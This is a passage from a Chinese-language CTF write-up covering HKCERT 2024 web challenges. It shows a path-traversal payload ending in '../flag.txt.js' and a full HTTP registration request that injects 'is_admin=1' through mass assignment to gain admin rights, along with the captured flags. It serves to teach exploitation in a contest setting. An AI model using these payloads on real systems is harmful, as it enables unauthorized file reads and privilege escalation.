+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././flag.txt.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18543724/13.png"></p>
+<p><strong>hkcert24{bu1ld1n9_4_w3bs3rv3r_t0_s3rv3_5t4t1c_w3bp4935_1s_n0ntr1vial}</strong></p>
+<h2 id="Mystiz’s-Mini-CTF-2"><a href="#Mystiz’s-Mini-CTF-2" class="headerlink" title="Mystiz’s Mini CTF (2)"></a>Mystiz’s Mini CTF (2)</h2><p>（2）做出来了（1）没做出来，绷</p>
+<p>下载附件，审计。发现GetFlag的条件在拥有admin权限。查看User model，有</p>
+<p><img src="/images/migrated/18543724/14.png"></p>
+<p>只要注册到is_admin为真的账户即可。直接去看register有没有注入</p>
+<p>发现在Register里直接使用用户的输入来进行User model的初始化。没有检测参数的合法性</p>
+<p><img src="/images/migrated/18543724/15.png"></p>
+<p>我们直接在注册的时候传入is_admin参数即可注册到admin权限的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /register/ HTTP/2</span><br><span class="line">Host: c16a-minictf-1-t100292-gynjajepa6zntwuvowczl5mv.hkcert24.pwnable.hk</span><br><span class="line">Content-Length: 71</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Ch-Ua: &quot;Not?A_Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;130&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: https://c16a-minictf-1-t100292-gynjajepa6zntwuvowczl5mv.hkcert24.pwnable.hk</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://c16a-minictf-1-t100292-gynjajepa6zntwuvowczl5mv.hkcert24.pwnable.hk/register/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">username=LamentXU&amp;password=1145141919810&amp;score=1145141919810&amp;is_admin=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18543724/16.png"></p>
+<p>直接进&#x2F;api&#x2F;admin&#x2F;challenges拿flag就行</p>
+<p><img src="/images/migrated/18543724/17.png"></p>
+<p><strong>hkcert24{yOu_c4n_wrlt3_unsp3clf13d_4t7rlbu73s_t0_th3_us3r_mOd3l}}</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#New-Free-Lunch"><span class="toc-number">1.1.</span> <span class="toc-text">New Free Lunch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webpage-to-PDF-1"><span class="toc-number">1.2.</span> <span class="toc-text">Webpage to PDF (1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Custom-Web-Server-1"><span class="toc-number">1.3.</span> <span class="toc-text">Custom Web Server (1)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mystiz%E2%80%99s-Mini-CTF-2"><span class="toc-number">1.4.</span> <span class="toc-text">Mystiz’s Mini CTF (2)</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&text=HKCERT 2024 部分 web wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&is_video=false&description=HKCERT 2024 部分 web wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HKCERT 2024 部分 web wp&body=Check out this article: https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&title=HKCERT 2024 部分 web wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&name=HKCERT 2024 部分 web wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-11-13-hkcert-2024-web-wp/&t=HKCERT 2024 部分 web wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
